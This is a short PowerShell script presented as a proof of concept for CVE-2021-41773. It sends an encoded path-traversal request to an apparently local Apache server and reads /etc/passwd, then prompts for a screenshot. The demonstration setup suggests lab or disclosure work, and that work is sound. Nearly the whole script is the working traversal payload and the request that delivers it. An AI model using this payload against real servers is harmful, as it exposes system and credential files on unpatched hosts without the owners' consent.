Write-Host "=== CVE-2021-41773 PoC: reading /etc/passwd ===" -ForegroundColor Cyan
Write-Host ""

$url = "http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
Write-Host "Request: $url" -ForegroundColor Gray
Write-Host ""

curl.exe -s --path-as-is $url

Write-Host ""
Write-Host "=== Done. Screenshot this window now. ===" -ForegroundColor Green
Read-Host "Press Enter to close"
